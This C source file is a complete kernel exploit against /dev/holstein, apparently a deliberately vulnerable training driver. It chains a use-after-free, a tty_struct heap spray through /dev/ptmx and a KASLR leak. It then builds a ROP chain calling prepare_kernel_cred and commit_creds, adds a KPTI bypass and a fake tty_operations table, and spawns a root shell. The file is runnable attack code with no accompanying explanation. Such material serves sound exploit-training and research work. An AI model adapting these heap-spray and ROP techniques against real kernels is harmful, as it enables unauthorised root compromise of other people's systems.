#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <unistd.h>

unsigned long kbase, g_buf, current;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

#define ofs_tty_ops 0xc39c60
#define rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp (kbase + 0x14fbea)
#define rop_pop_rdi (kbase + 0x14078a)
#define rop_pop_rcx (kbase + 0x0eb7e4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x638e9b)
#define rop_bypass_kpti (kbase + 0x800e26)
#define addr_commit_creds (kbase + 0x0723c0)
#define addr_prepare_kernel_cred (kbase + 0x072560)

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] ROOT!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm("movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();

  // Use-after-Free
  int fd1 = open("/dev/holstein", O_RDWR);
  int fd2 = open("/dev/holstein", O_RDWR);
  if (fd1 == -1 || fd2 == -1)
    fatal("/dev/holstein");
  close(fd1);

  // tty_struct spray
  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // KASLR LEAK
  char buf[0x400];
  read(fd2, buf, 0x400);
  kbase = *(unsigned long *)&buf[0x18] - ofs_tty_ops;
  g_buf = *(unsigned long *)&buf[0x38] - 0x38;
  printf("kbase = 0x%016lx\n", kbase);
  printf("g_buf = 0x%016lx\n", g_buf);

  // ROP chain
  unsigned long *chain = (unsigned long *)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  // tty_operations
  *(unsigned long *)&buf[0x3f8] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;
  printf("tty_ops: %16lx\n", *(unsigned long *)&buf[0x3f8]);
  write(fd2, buf, 0x400);

  // Use-after-Free 2
  int fd3 = open("/dev/holstein", O_RDWR);
  int fd4 = open("/dev/holstein", O_RDWR);
  if (fd3 == -1 || fd4 == -1)
    fatal("/dev/holstein");
  close(fd3);
  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  read(fd4, buf, 0x400);
  *(unsigned long *)&buf[0x18] = g_buf + 0x3f8 - 12 * 8;
  printf("pointer: %16lx\n", *(unsigned long *)&buf[0x18]);
  write(fd4, buf, 0x20);

  // RIP
  for (int i = 50; i < 100; i++) {
    ioctl(spray[i], 0, g_buf - 8); // rsp=rdx; pop rbp;
  }

  return 0;
}
